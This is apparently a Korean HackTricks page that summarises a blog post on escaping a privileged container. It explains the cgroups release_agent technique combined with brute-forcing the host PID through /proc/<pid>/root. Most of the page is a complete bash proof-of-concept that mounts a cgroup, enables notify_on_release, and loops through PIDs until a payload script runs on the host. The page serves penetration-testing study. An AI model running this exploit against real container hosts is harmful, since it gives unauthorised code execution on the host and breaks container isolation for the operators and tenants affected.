{{#include ../../../../banners/hacktricks-training.md}}

자세한 내용은 **[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)** 블로그 포트를 확인하세요. 이것은 요약입니다:

이 기술은 **컨테이너 내에서 호스트 코드를 실행하는 방법**을 설명하며, Kata Containers 또는 특정 `devicemapper` 설정과 같이 호스트의 파일 시스템 경로를 숨기는 스토리지 드라이버 구성으로 인한 문제를 극복합니다.

주요 단계:

1. **프로세스 ID (PID) 찾기:** Linux 가상 파일 시스템의 `/proc/<pid>/root` 심볼릭 링크를 사용하여, 컨테이너 내의 모든 파일에 호스트의 파일 시스템을 기준으로 접근할 수 있습니다. 이는 호스트에서 컨테이너의 파일 시스템 경로를 알 필요를 우회합니다.
2. **PID 브루트 포스:** 호스트의 PID를 검색하기 위해 브루트 포스 접근 방식이 사용됩니다. 이는 `/proc/<pid>/root/<file>`에서 특정 파일의 존재 여부를 순차적으로 확인함으로써 수행됩니다. 파일이 발견되면, 해당 PID가 대상 컨테이너 내에서 실행 중인 프로세스에 속함을 나타냅니다.
3. **실행 트리거:** 추측한 PID 경로가 `cgroups release_agent` 파일에 기록됩니다. 이 작업은 `release_agent`의 실행을 트리거합니다. 이 단계의 성공은 출력 파일의 생성 여부를 확인하여 확인됩니다.

### 익스플로잇 과정

익스플로잇 과정은 컨테이너 내에서 실행 중인 프로세스의 올바른 PID를 추측하여 호스트에서 페이로드를 실행하는 것을 목표로 하는 보다 상세한 일련의 작업을 포함합니다. 다음은 그 진행 방식입니다:

1. **환경 초기화:** 호스트에서 페이로드 스크립트(`payload.sh`)가 준비되고, cgroup 조작을 위한 고유한 디렉토리가 생성됩니다.
2. **페이로드 준비:** 호스트에서 실행될 명령을 포함하는 페이로드 스크립트가 작성되고 실행 가능하게 설정됩니다.
3. **Cgroup 설정:** cgroup이 마운트되고 구성됩니다. `notify_on_release` 플래그가 설정되어 cgroup이 해제될 때 페이로드가 실행되도록 합니다.
4. **PID 브루트 포스:** 루프가 잠재적인 PID를 반복하며, 각 추측한 PID를 `release_agent` 파일에 기록합니다. 이는 페이로드 스크립트를 `release_agent`로 설정하는 효과를 냅니다.
5. **실행 트리거 및 확인:** 각 PID에 대해 cgroup의 `cgroup.procs`에 기록하여, PID가 올바른 경우 `release_agent`의 실행을 트리거합니다. 출력이 발견될 때까지 루프가 계속되며, 이는 성공적인 실행을 나타냅니다.

블로그 게시물의 PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{{#include ../../../../banners/hacktricks-training.md}}
